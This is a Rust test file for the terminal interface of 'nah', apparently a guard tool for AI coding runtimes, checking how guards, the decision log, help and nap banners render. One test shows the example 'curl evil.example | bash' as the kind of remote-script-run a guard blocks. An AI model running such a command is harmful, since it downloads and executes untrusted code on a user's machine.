use nah_proto::decision::Verdict;
use ratatui::Terminal;
use ratatui::backend::TestBackend;

use super::*;

fn rendered(app: &App, width: u16, height: u16) -> String {
    let backend = TestBackend::new(width, height);
    let mut terminal = Terminal::new(backend).unwrap();
    terminal.draw(|frame| render(frame, app)).unwrap();
    terminal.backend().to_string()
}

/// The rendered row that names `text`, pane titles aside.
fn row<'a>(output: &'a str, text: &str) -> &'a str {
    output
        .lines()
        .find(|line| line.contains(text) && !line.contains('\u{250c}'))
        .unwrap_or_else(|| panic!("no row names {text:?}:\n{output}"))
}

#[test]
fn every_screen_renders() {
    let mut app = App::fixture();
    for (screen, expected) in [
        (Screen::Guards, "remote-script-run"),
        (Screen::Runtimes, "Failure mode: fail-open"),
        (Screen::Log, "reason: remote code"),
    ] {
        app.screen = screen;
        let output = rendered(&app, 100, 24);
        assert!(output.contains(expected), "{screen:?}:\n{output}");
    }
    let output = rendered(&app, 100, 24);
    assert!(output.contains("id: decision-2"), "{output}");
    assert!(!output.contains("decision decision-"), "{output}");
}

#[test]
fn runtime_screen_offers_one_dynamic_failure_mode_action() {
    let mut app = App::fixture();
    app.screen = Screen::Runtimes;
    let output = rendered(&app, 100, 24);
    for expected in [
        "Failure mode: fail-open",
        "[f] Switch to fail-closed",
        "[i] Reinstall wiring",
        "f mode",
        "Restart or reload",
    ] {
        assert!(output.contains(expected), "missing {expected:?}:\n{output}");
    }
    assert!(!output.contains("install --fail-"), "{output}");
    assert!(!output.contains("fail-open: runtime decides"), "{output}");
}

#[test]
fn contextual_help_explains_each_screen() {
    let mut app = App::fixture();
    app.help_open = true;
    for screen in [Screen::Guards, Screen::Runtimes, Screen::Log] {
        app.screen = screen;
        let output = rendered(&app, 100, 24);
        assert!(output.contains("ABOUT"), "{screen:?}:\n{output}");
        assert!(output.contains("KEYS"), "{screen:?}:\n{output}");
        assert!(output.contains("GLOBAL"), "{screen:?}:\n{output}");
        assert!(
            output.contains(&format!("Help — {}", help_title(screen))),
            "{screen:?}:\n{output}"
        );
        assert!(
            output.contains("? or Esc close help"),
            "{screen:?}:\n{output}"
        );
    }
}

#[test]
fn help_explains_the_confirmation_underneath_it() {
    let mut app = App::fixture();
    app.screen = Screen::Runtimes;
    app.request_runtime_failure_policy();
    app.help_open = true;

    let output = rendered(&app, 100, 28);

    assert!(output.contains("OPEN PROMPT"), "{output}");
    app.confirmation = None;
    let output = rendered(&app, 100, 28);
    assert!(!output.contains("OPEN PROMPT"), "{output}");
}

#[test]
fn every_idle_screen_offers_help() {
    let mut app = App::fixture();
    for screen in [Screen::Guards, Screen::Runtimes, Screen::Log] {
        app.screen = screen;
        let output = rendered(&app, 100, 24);
        assert!(output.contains("? help"), "{screen:?}:\n{output}");
    }
}

#[test]
fn runtime_failure_mode_confirmation_explains_the_selected_change() {
    let mut app = App::fixture();
    app.screen = Screen::Runtimes;
    app.request_runtime_failure_policy();
    let output = rendered(&app, 100, 24);
    for expected in ["Switch Codex to fail-closed?", "y switch  n cancel"] {
        assert!(output.contains(expected), "missing {expected:?}:\n{output}");
    }
}

#[test]
fn log_screen_filters_by_outcome() {
    let mut app = App::fixture();
    app.screen = Screen::Log;

    let output = rendered(&app, 100, 24);
    assert!(output.contains("all: 2 of 2"), "{output}");
    assert!(
        output.contains("time:     2026-07-23T12:00:05Z"),
        "{output}"
    );

    app.cycle_log_filter();
    // The runtime column leaves the command only a few cells at 100, so
    // this reads the row where the command is still whole.
    let output = rendered(&app, 100, 24);
    assert!(output.contains("block: 1 of 1"), "{output}");
    assert!(output.contains("curl"), "{output}");

    // Nothing in the fixture was saved.
    app.cycle_log_filter();
    let output = rendered(&app, 100, 24);
    assert!(output.contains("saved: 0 of 2"), "{output}");

    app.cycle_log_filter();
    let output = rendered(&app, 100, 24);
    assert!(output.contains("delegate: 1 of 2"), "{output}");
    assert!(output.contains("git status"), "{output}");
    assert!(!output.contains("curl"), "{output}");
}

#[test]
fn failure_summary_appears_only_on_the_log_screen() {
    let mut app = App::fixture();
    app.failure_summary = Some(crate::records::FailureSummary {
        calls: 3,
        latest_timestamp: "2026-07-23T12:00:05Z".into(),
        latest_component: "multiple components".into(),
        ..Default::default()
    });

    app.screen = Screen::Log;
    let output = rendered(&app, 120, 24);
    assert!(
        output.contains("evaluation failures affected 3 calls"),
        "{output}"
    );
    assert!(output.contains("multiple"), "{output}");
    assert!(output.contains("components"), "{output}");
    // A message joins it rather than hiding it.
    app.message = Some(crate::tui::app::Message {
        text: "refreshed".into(),
        kind: MessageKind::Info,
    });
    let output = rendered(&app, 120, 24);
    assert!(output.contains("refreshed"), "{output}");
    assert!(
        output.contains("evaluation failures affected 3 calls"),
        "{output}"
    );
    app.message = None;

    for screen in [Screen::Guards, Screen::Runtimes] {
        app.screen = screen;
        let output = rendered(&app, 120, 24);
        assert!(!output.contains("evaluation failures affected"), "{output}");
    }
}

/// The log screen with its summary open over a log holding a call of every
/// kind: 40 ran, 12 blocked by four guards, 6 saved with two undo points
/// kept, and 8 not fully checked.
fn summary_app() -> App {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.summary_open = true;
    app.log_summary = crate::records::LogSummary {
        calls: 66,
        ran: 40,
        blocked: 12,
        blocking_guards: [
            ("secrets", 5),
            ("work", 4),
            ("untrusted-code", 2),
            ("machine", 1),
        ]
        .into_iter()
        .map(|(guard, count)| (guard.to_owned(), count))
        .collect(),
        saved: 6,
        saved_snapshots: vec![],
    };
    app.failure_summary = Some(crate::records::FailureSummary {
        calls: 8,
        let_run: 6,
        blocked: 1,
        latest_timestamp: "2026-07-23T12:00:05Z".into(),
        latest_component: "observation".into(),
    });
    app.undo_points = Some(UndoPoints {
        kept: 2,
        newest: Some("2026-07-23T12:00:11Z".into()),
    });
    app
}

/// The rendered rows of the summary, each with its count.
fn summary_rows(output: &str) -> Vec<(SummaryRow, usize)> {
    [
        SummaryRow::Ran,
        SummaryRow::Blocked,
        SummaryRow::SavedFirst,
        SummaryRow::NotFullyChecked,
    ]
    .into_iter()
    .filter_map(|wanted| {
        let line = output.lines().find(|line| line.contains(wanted.label()))?;
        let count = line
            .split_whitespace()
            .find_map(|word| word.trim_matches('│').parse().ok())
            .unwrap();
        Some((wanted, count))
    })
    .collect()
}

#[test]
fn the_log_summary_rows_add_up_to_every_call() {
    let app = summary_app();
    let output = rendered(&app, 80, 24);

    let rows = summary_rows(&output);
    assert_eq!(rows, app.summary_rows(), "{output}");
    assert_eq!(rows.len(), 4, "{output}");
    assert_eq!(
        rows.iter().map(|(_, count)| count).sum::<usize>(),
        app.log_summary.calls
    );
    // At 80 columns the blocked row names the three guards that blocked most.
    let blocked = row(&output, SummaryRow::Blocked.label());
    for guard in ["secrets 5", "work 4", "untrusted-code 2"] {
        assert!(blocked.contains(guard), "{output}");
    }
    assert!(!output.contains("machine 1"), "{output}");

    // The longest shipped guard names, with three-digit counts, still all
    // fit at 80 columns.
    let mut app = summary_app();
    app.log_summary.ran += 221;
    app.log_summary.calls += 221;
    app.log_summary.blocking_guards = [
        ("untrusted-code", 35),
        ("infrastructure", 25),
        ("exfiltration", 15),
        ("machine", 1),
    ]
    .into_iter()
    .map(|(guard, count)| (guard.to_owned(), count))
    .collect();
    let output = rendered(&app, 80, 24);
    for guard in ["untrusted-code 35", "infrastructure 25", "exfiltration 15"] {
        assert!(output.contains(guard), "{output}");
    }
    assert_eq!(summary_rows(&output), app.summary_rows(), "{output}");

    // A row with no calls is left out, and the rest still add up.
    let mut app = summary_app();
    app.log_summary.calls -= app.log_summary.saved;
    app.log_summary.saved = 0;
    let output = rendered(&app, 80, 24);
    let rows = summary_rows(&output);
    assert!(
        rows.iter().all(|(row, _)| *row != SummaryRow::SavedFirst),
        "{output}"
    );
    assert_eq!(
        rows.iter().map(|(_, count)| count).sum::<usize>(),
        app.log_summary.calls
    );
}

#[test]
fn an_empty_or_unreadable_log_summarizes_no_rows() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.summary_open = true;
    let empty = rendered(&app, 80, 24);
    assert!(summary_rows(&empty).is_empty(), "{empty}");

    // A log that could not be read is not shown as an empty one.
    let mut app = summary_app();
    app.log_unreadable = Some("decision log is unreadable: audit-io".into());
    let unreadable = rendered(&app, 80, 24);
    assert!(summary_rows(&unreadable).is_empty(), "{unreadable}");
    let full = SummaryForm {
        guards: SUMMARY_GUARDS,
        guards_below: false,
        details: true,
    };
    assert_ne!(
        summary_lines(&app, full),
        summary_lines(&App::fixture(), full)
    );
}

#[test]
fn a_narrow_terminal_drops_the_guards_beside_the_blocked_count_first() {
    let app = summary_app();
    let output = rendered(&app, 50, 24);

    assert_eq!(summary_rows(&output), app.summary_rows(), "{output}");
    assert!(
        !row(&output, SummaryRow::Blocked.label()).contains("secrets"),
        "{output}"
    );
    // Each row still fits on its own line.
    for (wanted, _) in app.summary_rows() {
        assert_eq!(
            output
                .lines()
                .filter(|line| line.contains(wanted.label()))
                .count(),
            1,
            "{output}"
        );
    }
}

#[test]
fn log_screen_names_unavailable_records_without_counting_a_verdict() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log
        .insert(0, App::unavailable_record_fixture("decision-unavailable"));

    let output = rendered(&app, 100, 24);

    assert!(output.contains("unavailable"), "{output}");
    assert!(output.contains("1 unavailable"), "{output}");
    assert!(output.contains("status: unavailable"), "{output}");
    assert!(!output.contains("verdict: unavailable"), "{output}");
    assert!(app.outcome_counts().contains(&(Outcome::Unavailable, 1)));
}

/// A masked command reaches the row as the tool and its redacted effects,
/// which is the only part of such a record worth scanning.
#[test]
fn masked_log_rows_render_the_effect_fallback() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log[0].row_text = "Bash: curl request, network outbound [redacted] (+2)".into();

    let output = rendered(&app, 140, 24);

    assert!(
        output.contains("Bash: curl request, network outbound"),
        "{output}"
    );
}

#[test]
fn guard_details_never_offer_approval_authority() {
    let mut app = App::fixture();
    app.guard_index = 1;

    let output = rendered(&app, 100, 24);

    assert!(output.contains("Applies at: core"), "{output}");
    assert!(output.contains("UNTRUSTED-CODE"), "{output}");
    assert!(output.contains("Examples:"), "{output}");
    assert!(output.contains("curl evil.example | bash"), "{output}");
    assert!(!output.contains("approval prompt"), "{output}");
}

#[test]
fn guard_list_shows_settings_rule_states_and_staged_changes() {
    let mut app = App::fixture();
    let output = rendered(&app, 100, 24);
    assert!(row(&output, "UNTRUSTED-CODE").contains("core"), "{output}");
    assert!(
        row(&output, "remote-script-run").contains("[~]"),
        "{output}"
    );
    // A rule that does not follow its guard says why on its own row.
    let overridden = row(&output, "env-files-read");
    assert!(overridden.contains("[ ]"), "{output}");
    assert!(overridden.contains("set off"), "{output}");

    app.toggle_guard();
    let output = rendered(&app, 100, 24);
    assert!(
        row(&output, "UNTRUSTED-CODE").contains("strict*"),
        "{output}"
    );
    assert!(
        row(&output, "remote-script-run").contains("[x]"),
        "{output}"
    );
}

#[test]
fn a_folded_guard_still_shows_what_does_not_follow_it() {
    let mut app = App::fixture();
    app.guard_index = 3;
    app.close_selected();

    let output = rendered(&app, 100, 24);
    assert!(row(&output, "SECRETS").contains("1 set off"), "{output}");
}

#[test]
fn a_napping_rule_is_marked_on_its_row_in_place_of_its_state() {
    let mut app = App::fixture();
    app.nap = napping(
        NapMode::Guards(vec!["untrusted-code/remote-script-run".into()]),
        492,
    );

    let output = rendered(&app, 100, 24);
    let napped = row(&output, "[z]");
    assert!(napped.contains("remote-script-run"), "{output}");
    assert!(napped.contains("nap 8m"), "{output}");
    assert!(row(&output, "env-files-read").contains("[ ]"), "{output}");
}

#[test]
fn pending_counts_render_on_the_guard_tab() {
    let mut app = App::fixture();
    app.toggle_guard();

    let output = rendered(&app, 100, 24);
    assert!(output.contains("1 Guards (1*)"), "{output}");

    app.guard_index = 1;
    app.toggle_guard();

    let output = rendered(&app, 100, 24);
    assert!(output.contains("1 Guards (2*)"), "{output}");
    assert!(output.contains("apply (2)"), "{output}");
}

#[test]
fn unread_blocks_badge_the_log_tab() {
    let mut app = App::fixture();
    let mut log = vec![App::record_fixture("decision-3", Verdict::Block)];
    log.extend(app.log.clone());
    app.apply_reloaded_log(log);

    let output = rendered(&app, 100, 24);
    assert!(output.contains("3 Log (1!)"), "{output}");

    app.select_screen(Screen::Log);
    let output = rendered(&app, 100, 24);
    assert!(output.contains("[3 Log]"), "{output}");
    assert!(!output.contains("(1!)"), "{output}");
}

#[test]
fn the_log_counts_outcomes_and_names_its_filters() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log.insert(0, App::saved_record_fixture("decision-3"));

    let wide = rendered(&app, 100, 24);
    assert!(wide.contains("1 block, 1 saved, 1 delegate"), "{wide}");
    assert!(wide.contains("v outcome: all"), "{wide}");
    assert!(wide.contains("r runtime: all"), "{wide}");

    // The narrowest terminal has no room for the counts; the filters stay.
    let narrow = rendered(&app, 50, 14);
    assert!(narrow.contains("Decisions (all: 3 of 3)"), "{narrow}");
    assert!(narrow.contains("v outcome: all"), "{narrow}");
    assert!(narrow.contains("runtime: all"), "{narrow}");
    assert!(narrow.contains("? help"), "{narrow}");
}

#[test]
fn a_saved_decision_shows_each_snapshot_with_its_undo() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    let mut saved = App::saved_record_fixture("decision-3");
    saved.saved.push(crate::records::SavedSnapshot {
        rules: vec!["work/untracked-clean".into()],
        snapshot: "1abc2345".into(),
        root: "/repo/vendor".into(),
        holds: "2 files".into(),
        apart: true,
    });
    app.log.insert(0, saved);

    let output = rendered(&app, 140, 40);
    assert!(output.contains("saved, then let through"), "{output}");
    for undo in [
        "Undo: nah undo 0dec7505",
        "Undo: nah undo 1abc2345 --into DIR",
    ] {
        assert!(output.contains(undo), "{output}");
    }
}

#[test]
fn the_active_runtime_filter_titles_the_list_and_shows_in_the_footer() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.cycle_log_runtime_filter();

    // Wide enough that the runtime column still leaves the command whole.
    let output = rendered(&app, 100, 24);
    assert!(output.contains("r runtime: claude"), "{output}");
    assert!(
        output.contains("Decisions (all, claude: 1 of 2)"),
        "{output}"
    );
    assert!(output.contains("git status"), "{output}");
    assert!(!output.contains("curl"), "{output}");
}

#[test]
fn log_search_titles_the_list_and_takes_over_the_footer() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log[1].explanation = "id: decision-1\ncommand: git status".into();

    app.begin_log_search();
    for character in "git".chars() {
        app.push_log_search(character);
    }

    // Typing shows the live query with a cursor instead of the keymap.
    let output = rendered(&app, 100, 24);
    assert!(output.contains("/git\u{2588}"), "{output}");
    assert!(!output.contains("v filter"), "{output}");
    assert!(output.contains("Esc cancel"), "{output}");
    assert!(output.contains("Decisions (all, /git: 1 of 2)"), "{output}");
    assert!(output.contains("git status"), "{output}");
    assert!(!output.contains("curl"), "{output}");

    // A confirmed search stays in the title and gives the keymap back.
    app.confirm_log_search();
    let output = rendered(&app, 100, 24);
    assert!(output.contains("Decisions (all, /git: 1 of 2)"), "{output}");
    assert!(output.contains("/ search"), "{output}");
    assert!(!output.contains("\u{2588}"), "{output}");

    // The search narrows what the verdict filter already narrowed.
    app.cycle_log_filter();
    let output = rendered(&app, 100, 24);
    assert!(
        output.contains("Decisions (block, /git: 0 of 1)"),
        "{output}"
    );
}

#[test]
fn log_search_degrades_at_the_minimum_width() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.begin_log_search();
    for character in "remote".chars() {
        app.push_log_search(character);
    }

    let narrow = rendered(&app, 50, 14);
    assert!(narrow.contains("/remote\u{2588}"), "{narrow}");
    assert!(!narrow.contains("git status"), "{narrow}");
    // The title still closes its border, so it fits the narrow pane.
    assert!(
        narrow.contains("(all, /remote: 1 of 2) \u{2500}"),
        "{narrow}"
    );

    // A query too long for the title truncates there rather than
    // overflowing, and the footer still carries all of it.
    for character in "-plus-a-long-tail".chars() {
        app.push_log_search(character);
    }
    let narrow = rendered(&app, 50, 14);
    assert!(
        narrow.contains("/remote-plus-a-long-tail\u{2588}"),
        "{narrow}"
    );
    assert!(narrow.contains("Decisions (all, /remote-plus"), "{narrow}");
}

#[test]
fn detail_scrolls_past_a_long_explanation() {
    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log[0].explanation = (0..40)
        .map(|line| format!("effect-{line:02}\n"))
        .collect::<String>();

    let output = rendered(&app, 100, 24);
    assert!(output.contains("effect-00"), "{output}");
    assert!(!output.contains("effect-39"), "{output}");

    app.detail_scroll = u16::MAX;
    let output = rendered(&app, 100, 24);
    assert!(output.contains("effect-39"), "{output}");
    assert!(!output.contains("effect-00"), "{output}");

    // Paging never skips a line, down to the smallest terminal: each page
    // starts no later than the line after the last one shown.
    let shown = |output: &str| {
        (0..40)
            .filter(|line| output.contains(&format!("effect-{line:02}")))
            .collect::<Vec<_>>()
    };
    app.detail_scroll = 0;
    let mut last = *shown(&rendered(&app, 50, 14)).last().unwrap();
    while last < 39 {
        app.scroll_detail(true);
        let page = shown(&rendered(&app, 50, 14));
        assert!(page[0] <= last + 1, "{page:?} after {last}");
        assert!(*page.last().unwrap() > last, "{page:?} after {last}");
        last = *page.last().unwrap();
    }
}

fn napping(mode: NapMode, remaining: u64) -> Option<NapStatus> {
    Some(NapStatus { mode, remaining })
}

#[test]
fn an_active_nap_banners_every_screen_until_it_ends() {
    let mut app = App::fixture();
    assert!(!rendered(&app, 100, 24).contains("NAP "));

    app.nap = napping(NapMode::SelfProtection, 372);
    for screen in [Screen::Guards, Screen::Runtimes, Screen::Log] {
        app.screen = screen;
        let output = rendered(&app, 100, 24);
        let banner = row(&output, "NAP ");
        assert!(
            banner.contains("self-protection paused"),
            "{screen:?}:\n{output}"
        );
        assert!(banner.contains("6m 12s left"), "{screen:?}:\n{output}");
        assert!(banner.contains("w wake"), "{screen:?}:\n{output}");
    }

    // The `all` nap pauses more and says so.
    app.nap = napping(NapMode::All, 45);
    let output = rendered(&app, 100, 24);
    assert!(output.contains("all enforcement paused"), "{output}");
    assert!(output.contains("45s left"), "{output}");
    // The banner takes its row from the body, not from the tabs or footer.
    assert!(output.contains("3 Log"), "{output}");
    assert!(output.contains("Decisions (all: 2 of 2)"), "{output}");

    // Expiry or a wake elsewhere clears it with no key pressed.
    app.nap = None;
    assert!(!rendered(&app, 100, 24).contains("NAP "));
}

#[test]
fn the_nap_banner_fits_the_narrowest_supported_terminal() {
    let mut app = App::fixture();
    app.nap = napping(NapMode::All, 599);
    let narrow = rendered(&app, 50, 14);
    let banner = row(&narrow, "NAP ");
    assert!(banner.contains("9m 59s left"), "{narrow}");
    assert!(banner.contains("all enforcement paused"), "{narrow}");
    assert!(banner.contains("w wake"), "{narrow}");
    // The row it takes comes out of the body, which still works.
    assert!(narrow.contains("1 Guards"), "{narrow}");
    assert!(narrow.contains("UNTRUSTED-CODE"), "{narrow}");
    assert!(narrow.contains("Enter apply"), "{narrow}");
}

#[test]
fn an_installation_with_nothing_hooked_says_so_on_every_screen() {
    let mut app = App::fixture();
    assert!(!rendered(&app, 100, 24).contains("No runtime is hooked"));

    app.runtimes[0].status = Ok(RuntimeHookStatus::NotConfigured);
    // A nap pauses nothing while no call reaches nah, so this comes first.
    app.nap = napping(NapMode::All, 60);
    for screen in [Screen::Guards, Screen::Runtimes, Screen::Log] {
        app.screen = screen;
        let output = rendered(&app, 100, 24);
        assert!(
            output.contains("No runtime is hooked"),
            "{screen:?}:\n{output}"
        );
        assert!(!output.contains("NAP "), "{screen:?}:\n{output}");
    }

    // A hook that needs reinstalling is still a hook.
    app.runtimes[0].status = Ok(RuntimeHookStatus::NeedsReinstall);
    assert!(!rendered(&app, 100, 24).contains("No runtime is hooked"));
}

/// A nap another Nah version wrote is named whole on every screen, hooked or
/// not, down to the narrowest supported terminal, and the body still renders.
#[test]
fn a_nap_from_another_version_is_named_whole_hooked_or_not() {
    let words = |text: &str| {
        text.replace('"', " ")
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
    };
    let mut app = App::fixture();
    let notice = words(OTHER_VERSION_NOTICE);
    assert!(!words(&rendered(&app, 100, 24)).contains(&notice));

    app.other_version_nap = true;
    let hooked = app.runtimes[0].status.clone();
    for status in [hooked, Ok(RuntimeHookStatus::NotConfigured)] {
        app.runtimes[0].status = status;
        for screen in [Screen::Guards, Screen::Runtimes, Screen::Log] {
            app.screen = screen;
            for (width, height) in [(50, 14), (100, 24)] {
                let output = rendered(&app, width, height);
                assert!(
                    words(&output).contains(&notice),
                    "{screen:?} {width}x{height}:\n{output}"
                );
                assert_eq!(
                    output.contains("No runtime is hooked"),
                    app.nothing_hooked(),
                    "{screen:?} {width}x{height}:\n{output}"
                );
                assert!(output.contains("1 Guards"), "{output}");
            }
        }
    }
}

/// The Guards tab names every nah 1.x custom guard that no longer runs, whole,
/// at the narrowest supported width and beside the other notices.
#[test]
fn the_guards_tab_names_the_custom_guards_that_no_longer_run() {
    let mut app = App::fixture();
    let names = ["custom/company-deploy-policy", "custom/production-database"];
    app.stopped_custom_guards = Some(format!(
        "Nah 2.0 no longer runs custom guards; the blocks of these nah 1.x guards no longer apply: {}. See `nah guards`.",
        names.join(", ")
    ));
    let unhooked = app.runtimes[0].status.clone();
    for (status, nap) in [
        (unhooked.clone(), None),
        (Ok(RuntimeHookStatus::NotConfigured), None),
        (unhooked, napping(NapMode::All, 60)),
    ] {
        app.runtimes[0].status = status;
        app.nap = nap;
        for (width, height) in [(50, 24), (100, 30)] {
            let output = rendered(&app, width, height);
            for name in names {
                assert!(output.contains(name), "{width}x{height}:\n{output}");
            }
            assert!(
                output.contains("no longer apply"),
                "{width}x{height}:\n{output}"
            );
            assert!(
                output.contains("`nah guards`"),
                "{width}x{height}:\n{output}"
            );
        }
    }
    app.screen = Screen::Log;
    assert!(!rendered(&app, 100, 30).contains(names[0]));
}

#[test]
fn the_wake_modal_names_what_resumes() {
    let mut app = App::fixture();
    app.confirmation = Some(Confirmation::EndNap { mode: NapMode::All });

    let output = rendered(&app, 100, 24);
    assert!(
        output.contains("End the nap and restore enforcement?"),
        "{output}"
    );
    assert!(output.contains("y wake  n cancel"), "{output}");
    assert!(
        output.contains("All paused enforcement resumes immediately"),
        "{output}"
    );

    app.confirmation = Some(Confirmation::EndNap {
        mode: NapMode::SelfProtection,
    });
    let output = rendered(&app, 100, 24);
    assert!(
        output.contains("Self-protection resumes immediately"),
        "{output}"
    );
}

#[test]
fn log_rows_name_the_deciding_runtime() {
    let mut app = App::fixture();
    app.screen = Screen::Log;

    let wide = rendered(&app, 100, 24);
    assert!(row(&wide, "codex").contains("BLOCK"), "{wide}");
    assert!(row(&wide, "claude").contains("delegate"), "{wide}");

    // The narrowest pane leaves the command only what is left, but the
    // columns still line up inside intact borders.
    let narrow = rendered(&app, 50, 14);
    let listed = row(&narrow, "codex");
    assert!(listed.contains("\u{2502}> 12:00:05"), "{narrow}");
    assert!(listed.contains("curl"), "{narrow}");
    assert_eq!(listed.matches('\u{2502}').count(), 2, "{narrow}");
}

#[test]
fn every_stamped_runtime_renders_in_its_column() {
    use clap::ValueEnum;

    let names = crate::runtime::Runtime::value_variants()
        .iter()
        .map(|runtime| runtime.cli_name())
        .chain(std::iter::once("unknown"))
        .collect::<Vec<_>>();
    assert_eq!(names.len(), 9, "{names:?}");

    let mut app = App::fixture();
    app.screen = Screen::Log;
    app.log = names
        .iter()
        .enumerate()
        .map(|(index, name)| {
            let mut record = App::record_fixture(&format!("decision-{index}"), Verdict::Delegate);
            record.runtime = (*name).to_owned();
            record
        })
        .collect();

    let output = rendered(&app, 100, 36);
    for name in names {
        assert!(output.contains(name), "{name}:\n{output}");
    }

    // A name longer than any adapter stamps today clips at the pane edge
    // rather than breaking the row.
    app.log[0].runtime = "a-runtime-named-well-past-the-column".into();
    let output = rendered(&app, 100, 36);
    assert!(output.contains("a-runtime-named"), "{output}");
    assert!(output.contains("claude"), "{output}");
}

#[test]
fn tiny_terminal_preserves_confirmation_action() {
    let mut app = App::fixture();
    app.toggle_guard();
    app.request_quit();
    let output = rendered(&app, 40, 10);
    assert!(output.contains("y discard and quit"), "{output}");
}

/// The cells of one render, for checks of where things sit that read no
/// text.
fn rendered_cells(app: &App, width: u16, height: u16) -> ratatui::buffer::Buffer {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| render(frame, app)).unwrap();
    terminal.backend().buffer().clone()
}

#[test]
fn every_screen_keeps_room_the_narrowest_terminal_cannot_afford() {
    const BORDERS: &str = "│─┌┐└┘";
    let mut app = App::fixture();
    for (screen, help_open) in [
        (Screen::Guards, false),
        (Screen::Runtimes, false),
        (Screen::Log, false),
        (Screen::Guards, true),
    ] {
        app.screen = screen;
        app.help_open = help_open;
        let case = format!("{screen:?}, help {help_open}");
        // An ordinary terminal and a roomy one, with their outer margins.
        for (width, height, columns, rows) in [(100, 24, 2, 1), (190, 55, 4, 2)] {
            let cells = rendered_cells(&app, width, height);
            let symbol = |x: u16, y: u16| cells[(x, y)].symbol();
            let blank_row = |y: u16| (columns..width - columns).all(|x| symbol(x, y) == " ");
            for y in 0..height {
                for x in 0..width {
                    if x < columns || x >= width - columns || y < rows || y >= height - rows {
                        assert_eq!(symbol(x, y), " ", "{case} at {width}x{height}: ({x}, {y})");
                    }
                }
            }
            // The content starts right inside the margins.
            assert!(!blank_row(rows), "{case} at {width}x{height}");
            assert!(
                !(rows..height - rows).all(|y| symbol(columns, y) == " "),
                "{case} at {width}x{height}"
            );
            if help_open {
                continue;
            }
            // A blank row parts the tab bar from the panels, and the panels
            // from the key hints.
            assert!(blank_row(rows + 1), "{case} at {width}x{height}");
            let last_border = (0..height)
                .rev()
                .find(|&y| (0..width).any(|x| symbol(x, y) == "└"))
                .unwrap();
            assert!(blank_row(last_border + 1), "{case} at {width}x{height}");
            // Panel text keeps a column off every side border; only a
            // list's selection marker leads its row.
            for y in 0..height {
                for x in 1..width - 1 {
                    if symbol(x, y) == "│" {
                        for neighbour in [symbol(x - 1, y), symbol(x + 1, y)] {
                            assert!(
                                neighbour == " " || neighbour == ">" || BORDERS.contains(neighbour),
                                "{case} at {width}x{height}: ({x}, {y})"
                            );
                        }
                    }
                }
            }
        }
        // The narrowest terminal keeps its whole area for the content.
        let cells = rendered_cells(&app, 50, 14);
        assert!(!(0..50).all(|x| cells[(x, 0)].symbol() == " "), "{case}");
        assert!(!(0..14).all(|y| cells[(0, y)].symbol() == " "), "{case}");
    }
}

#[test]
fn room_is_never_taken_from_what_fits_without_it() {
    let mut app = App::fixture();
    // The tab bar shows the same parts as it would across the whole
    // terminal: its margin never drops the name or the help key.
    for width in MIN_WIDTH..=130 {
        let cells = rendered_cells(&app, width, 24);
        let tab_row = (0..24)
            .map(|y| {
                (0..width)
                    .map(|x| cells[(x, y)].symbol())
                    .collect::<String>()
            })
            .find(|row| !row.trim().is_empty())
            .unwrap();
        let mut whole = Terminal::new(TestBackend::new(width, 1)).unwrap();
        whole
            .draw(|frame| render_tabs(frame, &app, frame.area()))
            .unwrap();
        let whole_row = (0..width)
            .map(|x| whole.backend().buffer()[(x, 0)].symbol())
            .collect::<String>();
        assert_eq!(
            tab_row.split_whitespace().collect::<Vec<_>>(),
            whole_row.split_whitespace().collect::<Vec<_>>(),
            "at {width} columns"
        );
    }
    // Help as tall as the terminal still shows every row: the topmost box
    // is the dialog, and it holds each help line between its borders.
    app.help_open = true;
    let needed = help_lines(&app).len() + 2;
    for height in 21..=24 {
        let cells = rendered_cells(&app, 100, height);
        let (left, top) = (0..height)
            .flat_map(|y| (0..100).map(move |x| (x, y)))
            .find(|&cell| cells[cell].symbol() == "┌")
            .unwrap();
        let bottom = (top..height)
            .find(|&y| cells[(left, y)].symbol() == "└")
            .unwrap();
        assert!(
            usize::from(bottom - top + 1) >= needed,
            "at 100x{height}: {top}..={bottom}"
        );
    }
}
